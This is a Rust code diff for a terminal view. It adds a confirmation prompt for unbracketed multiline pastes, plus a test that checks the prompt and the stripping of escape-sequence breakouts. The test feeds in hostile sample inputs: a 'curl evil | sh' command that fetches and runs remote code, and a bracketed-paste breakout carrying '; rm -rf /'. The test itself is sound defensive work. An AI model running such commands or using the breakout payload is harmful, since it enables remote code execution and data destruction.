@@ -12,7 +12,11 @@ use gpui::{
     MouseMoveEvent, MouseUpEvent, ParentElement as _, Pixels, Point, Render, ScrollWheelEvent,
     SharedString, Styled as _, UTF16Selection, Window, div, point, px,
 };
-use gpui_component::ActiveTheme as _;
+use gpui_component::{
+    ActiveTheme as _, Sizable as _,
+    button::{Button, ButtonVariants as _},
+    h_flex, v_flex,
+};
 
 use super::element::TerminalElement;
 use super::input::encode_keystroke;
@@ -60,6 +64,9 @@ pub struct TerminalView {
     pub search_matches: Vec<(usize, usize, usize)>,
     pub search_current_idx: Option<usize>,
 
+    // Pending multiline paste awaiting user confirmation when bracketed paste is disabled
+    pub pending_paste: Option<String>,
+
     on_input: Option<InputCallback>,
     on_resize: Option<ResizeCallback>,
     http_client: Option<GateHttpClient>,
@@ -103,6 +110,7 @@ impl TerminalView {
             dragging_selection: false,
             search_matches: Vec::new(),
             search_current_idx: None,
+            pending_paste: None,
             on_input: None,
             on_resize: None,
             http_client: None,
@@ -158,6 +166,7 @@ impl TerminalView {
     pub fn reset_terminal(&mut self, cx: &mut Context<Self>) {
         self.term.reset();
         self.clear_selection();
+        self.pending_paste = None;
         cx.notify();
     }
 
@@ -355,6 +364,30 @@ impl TerminalView {
         if text.is_empty() {
             return;
         }
+        if self.term.paste_requires_confirmation(text) {
+            self.pending_paste = Some(text.to_string());
+            cx.notify();
+            return;
+        }
+        self.confirm_paste_text(text, cx);
+    }
+
+    pub fn confirm_paste(&mut self, cx: &mut Context<Self>) {
+        if let Some(text) = self.pending_paste.take() {
+            self.confirm_paste_text(&text, cx);
+        }
+    }
+
+    pub fn cancel_paste(&mut self, cx: &mut Context<Self>) {
+        if self.pending_paste.take().is_some() {
+            cx.notify();
+        }
+    }
+
+    fn confirm_paste_text(&mut self, text: &str, cx: &mut Context<Self>) {
+        if text.is_empty() {
+            return;
+        }
         self.term.scroll_to_bottom();
         let encoded = self.term.encode_paste(text);
         self.send_bytes(&encoded, cx);
@@ -482,10 +515,25 @@ impl TerminalView {
         let ks = &ev.keystroke;
         let m = &ks.modifiers;
 
+        let key_lower = ks.key.to_ascii_lowercase();
+        if self.pending_paste.is_some() && !m.control && !m.alt && !m.platform {
+            if key_lower == "escape" {
+                self.cancel_paste(cx);
+                window.prevent_default();
+                cx.stop_propagation();
+                return;
+            }
+            if key_lower == "enter" {
+                self.confirm_paste(cx);
+                window.prevent_default();
+                cx.stop_propagation();
+                return;
+            }
+        }
+
         // Copy / Paste shortcuts (aligned with clients/web/src/keys.ts `browserShortcut`):
         // - Copy: Cmd+C, Ctrl+Shift+C, Ctrl+Insert, or Ctrl+C when terminal has an active selection
         // - Paste: Cmd+V, Ctrl+V, Ctrl+Shift+V, or Shift+Insert
-        let key_lower = ks.key.to_ascii_lowercase();
         let is_copy = (m.platform && !m.control && !m.alt && key_lower == "c")
             || (m.control && !m.alt && key_lower == "c" && (m.shift || self.has_selection()))
             || (m.control && !m.shift && !m.alt && key_lower == "insert");
@@ -768,10 +816,12 @@ impl Render for TerminalView {
         let st = self.term.state();
         let scrolled = st.scroll_offset > 0;
         let exited = self.exited;
+        let pending_paste = self.pending_paste.clone();
         let theme = cx.theme();
+        let ch_idx = self.channel as usize;
 
         div()
-            .id(("term-pane", self.channel as usize))
+            .id(("term-pane", ch_idx))
             .key_context("TerminalView")
             .track_focus(&self.focus_handle)
             .size_full()
@@ -788,6 +838,51 @@ impl Render for TerminalView {
             .on_mouse_up(MouseButton::Middle, cx.listener(Self::on_mouse_up))
             .on_scroll_wheel(cx.listener(Self::on_scroll_wheel))
             .child(TerminalElement::new(view))
+            .children(pending_paste.map(|text| {
+                let line_count = text.lines().count().max(1);
+                v_flex()
+                    .absolute()
+                    .top_2()
+                    .left_3()
+                    .right_3()
+                    .p_3()
+                    .gap_2()
+                    .rounded(px(6.0))
+                    .bg(theme.background)
+                    .border_1()
+                    .border_color(theme.warning)
+                    .child(
+                        div()
+                            .text_xs()
+                            .text_color(theme.warning)
+                            .child(format!(
+                                "Bracketed paste is disabled. Pasting {line_count} line(s) containing newlines may execute commands immediately."
+                            )),
+                    )
+                    .child(
+                        h_flex()
+                            .gap_2()
+                            .justify_end()
+                            .child(
+                                Button::new(("paste-cancel", ch_idx))
+                                    .xsmall()
+                                    .ghost()
+                                    .label("Cancel (Esc)")
+                                    .on_click(cx.listener(|this, _, _, cx| {
+                                        this.cancel_paste(cx);
+                                    })),
+                            )
+                            .child(
+                                Button::new(("paste-confirm", ch_idx))
+                                    .xsmall()
+                                    .danger()
+                                    .label("Paste Anyway (Enter)")
+                                    .on_click(cx.listener(|this, _, _, cx| {
+                                        this.confirm_paste(cx);
+                                    })),
+                            ),
+                    )
+            }))
             .children(scrolled.then(|| {
                 let offset = st.scroll_offset;
                 div()
@@ -924,5 +1019,60 @@ mod tests {
             format_paths_for_paste(&[r"C:\Users\My User\paste-1.png".to_string()]),
             "\"C:\\Users\\My User\\paste-1.png\" "
         );
+    }
+
+    #[gpui::test]
+    fn guards_unbracketed_multiline_paste_and_strips_esc_breakouts(cx: &mut TestAppContext) {
+        let sent: Rc<RefCell<Vec<Vec<u8>>>> = Rc::new(RefCell::new(Vec::new()));
+        let sent_cb = sent.clone();
+        let view = cx.new(|cx| {
+            TerminalView::new(
+                "test".into(),
+                1,
+                "test".into(),
+                1,
+                "linux".into(),
+                false,
+                "monospace",
+                14.0,
+                1.0,
+                100,
+                cx,
+            )
+            .with_callbacks(
+                Rc::new(move |bytes, _| sent_cb.borrow_mut().push(bytes.to_vec())),
+                Rc::new(|_, _, _| {}),
+            )
+        });
+
+        view.update(cx, |view, cx| {
+            // Unbracketed multiline paste is held for confirmation
+            view.paste_text_str("curl evil | sh\n", cx);
+            assert_eq!(view.pending_paste.as_deref(), Some("curl evil | sh\n"));
+            assert!(sent.borrow().is_empty());
+
+            // Cancel discards pending paste without sending
+            view.cancel_paste(cx);
+            assert!(view.pending_paste.is_none());
+            assert!(sent.borrow().is_empty());
+
+            // Confirm sends the sanitized & CR-normalized payload
+            view.paste_text_str("echo hi\x1b[201~\n", cx);
+            assert!(view.pending_paste.is_some());
+            view.confirm_paste(cx);
+            assert!(view.pending_paste.is_none());
+            assert_eq!(sent.borrow().as_slice(), &[b"echo hi[201~\r".to_vec()]);
+
+            sent.borrow_mut().clear();
+
+            // Enable bracketed paste: multiline paste sends immediately with nested ESC stripped
+            view.write_output(b"\x1b[?2004h", cx);
+            view.paste_text_str("safe\x1b[20\x1b[201~1~; rm -rf /\n", cx);
+            assert!(view.pending_paste.is_none());
+            assert_eq!(
+                sent.borrow().as_slice(),
+                &[b"\x1b[200~safe[20[201~1~; rm -rf /\r\x1b[201~".to_vec()]
+            );
+        });
     }
 }
